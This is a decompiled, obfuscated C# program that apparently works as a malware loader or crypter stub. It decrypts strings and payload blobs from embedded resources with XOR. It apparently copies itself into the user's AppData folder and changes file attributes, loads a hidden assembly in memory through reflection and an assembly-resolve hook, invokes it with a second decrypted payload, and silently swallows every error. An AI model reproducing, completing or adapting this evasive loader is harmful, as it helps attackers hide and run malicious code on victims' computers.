using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;

namespace ns0;

internal sealed class Class0
{
	private static bool bool_0;

	private static void Main()
	{
		Class15.smethod_6();
		Class10.smethod_7();
		Class5.Class6.smethod_7();
		smethod_4();
		try
		{
			ResourceManager resourceManager_ = new ResourceManager(Class1.Class2.smethod_0(1888777491, 7), Class1.smethod_0(716, 699));
			string string_ = (string)Class1.Class3.Class4.smethod_0(resourceManager_, Class1.Class2.smethod_0(1888777500, 0), 569, 598);
			string string_2 = (string)Class1.Class3.Class4.smethod_0(resourceManager_, Class1.Class2.smethod_0(1888777472, 7), 249, 150);
			string string_3 = smethod_3(Class1.smethod_0(575, 584), 979, 897);
			string string_4 = Class1.Class3.Class4.smethod_1(Environment.SpecialFolder.ApplicationData, 217, 181);
			if (!Class1.Class2.smethod_1(string_3, string_4, 115, 32))
			{
				byte[] byte_ = smethod_1(Class1.smethod_1(Class1.Class3.Class4.smethod_2(1012, 920), (string)Class1.Class3.Class4.smethod_0(resourceManager_, Class1.Class2.smethod_0(1888777487, 7), 853, 826), 396, 481), Class1.Class2.smethod_0(1888777524, 8));
				Class8.smethod_6(Class5.Class7.smethod_4(Class1.smethod_3(Class1.smethod_2(92, 12), 306, 291), Class1.Class2.smethod_0(1888777506, 0), 848, 844), byte_, 834, 820);
				Class8.Class9.smethod_6(Class5.Class7.smethod_4(Class8.smethod_5(Class8.smethod_4(792, 878), 834, 779), Class1.Class2.smethod_0(1888777511, 5), 67, 95), 3, 19);
			}
			Class5.smethod_3(resourceManager_, 656, 720);
			byte[] byte_2 = smethod_1(Class8.Class9.smethod_5(Class8.smethod_2(742, 748), string_, 990, 993), Class1.Class2.smethod_0(1888777528, 4));
			byte[] byte_3 = smethod_1(Class10.Class11.smethod_2(Class10.Class11.Class12.smethod_2(100, 102), string_2, 88, 87), Class1.Class2.smethod_0(1888777531, 7));
			smethod_0(byte_3, byte_2);
		}
		catch
		{
		}
	}

	public static void smethod_0(byte[] byte_0, byte[] byte_1)
	{
		Assembly assembly_ = Class1.Class2.smethod_2(byte_0, 842, 861);
		Type[] array = Class1.Class3.Class4.smethod_3(assembly_, 165, 168);
		Type[] array2 = array;
		foreach (Type type in array2)
		{
			if (!Class1.Class2.smethod_1(Class1.smethod_3(type, 535, 518), Class1.Class2.smethod_0(1888777561, 2), 233, 186))
			{
				continue;
			}
			MethodInfo[] array3 = Class1.Class3.smethod_0(type, 483, 400);
			MethodInfo[] array4 = array3;
			foreach (MethodInfo methodInfo in array4)
			{
				if (Class1.Class2.smethod_1(Class1.smethod_3(methodInfo, 7, 22), Class1.Class2.smethod_0(1888777551, 0), 428, 511))
				{
					Class5.smethod_4(methodInfo, null, new object[3]
					{
						false,
						smethod_3(Class1.smethod_0(185, 206), 437, 487),
						byte_1
					}, 642, 656);
				}
			}
		}
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0)
	{
		int num = 350;
		byte[] array = Class1.smethod_1(Class1.Class3.Class4.smethod_2(886, 795), string_0, 453, 424);
		for (int i = 0; i < byte_0.Length; i++)
		{
			byte_0[i] ^= (byte)((array[i % array.Length] >> i + num + array.Length) & 0xFF);
		}
		return byte_0;
	}

	internal static Assembly smethod_2(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		string text = Class1.Class2.smethod_0(1888777592, 6);
		string text2 = text;
		string text3 = Class1.Class2.smethod_3(text2, '1', 654, 762);
		AppDomain appDomain_ = Class1.Class3.smethod_1(550, 515);
		Dictionary<string, string> dictionary = (Dictionary<string, string>)Class1.Class2.smethod_4(appDomain_, text3, 318, 343);
		Assembly assembly;
		if (dictionary == null)
		{
			dictionary = new Dictionary<string, string>();
			Class1.Class3.Class4.smethod_4(appDomain_, text3, dictionary, 498, 471);
			Assembly assembly_ = Class1.smethod_0(720, 680);
			Stream stream = Class1.Class3.smethod_2(assembly_, text, 632, 636);
			if (stream == null)
			{
				return null;
			}
			byte[] array = new byte[Class1.Class3.Class4.smethod_5(stream, 675, 733) - 1L];
			int num = Class1.Class3.Class4.smethod_6(stream, 836, 835);
			Class1.Class2.smethod_5(stream, array, 0, array.Length, 804, 880);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] ^= (byte)((i + num) & 0xFF);
			}
			MemoryStream memoryStream = new MemoryStream();
			using (DeflateStream stream_ = new DeflateStream(new MemoryStream(array), CompressionMode.Decompress, leaveOpen: true))
			{
				byte[] array2 = new byte[1024];
				int int_;
				while ((int_ = Class1.Class2.smethod_5(stream_, array2, 0, array2.Length, 443, 494)) > 0)
				{
					Class1.Class3.Class4.smethod_7(memoryStream, array2, 0, int_, 790, 872);
				}
			}
			assembly = Class1.Class3.Class4.smethod_8(Class1.Class2.smethod_6(memoryStream, 215, 185), null, Class1.smethod_4(assembly_, 566, 528), 741, 692);
			Class5.Class7.smethod_1(appDomain_, text2, assembly, 343, 288);
			string[] array3 = Class5.Class7.smethod_5(assembly, 98, 38);
			foreach (string text4 in array3)
			{
				dictionary[text4] = text4;
			}
		}
		else
		{
			assembly = (Assembly)Class5.smethod_0(appDomain_, text2, 188, 235);
		}
		if (dictionary.ContainsKey(Class8.Class9.smethod_7(resolveEventArgs_0, 728, 736)))
		{
			return assembly;
		}
		return null;
	}

	static Class0()
	{
		Class15.smethod_6();
		Class10.smethod_7();
		Class5.Class6.smethod_7();
		smethod_4();
	}

	internal static string smethod_3(Assembly assembly_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 82:
				return Class5.Class7.smethod_6(assembly_0, 792, 803);
			}
		}
	}

	internal static void smethod_4()
	{
		if (bool_0)
		{
			return;
		}
		Type object_;
		Class5.Class7.smethod_7(object_ = Class5.Class6.smethod_6(typeof(Class0).TypeHandle, 160, 163), 165, 142);
		try
		{
			if (!bool_0)
			{
				bool_0 = true;
				Class5.smethod_5(Class8.Class9.smethod_3(498, 486), smethod_2, 899, 949);
			}
		}
		finally
		{
			Class5.Class7.smethod_7(object_, 600, 628);
		}
	}
}
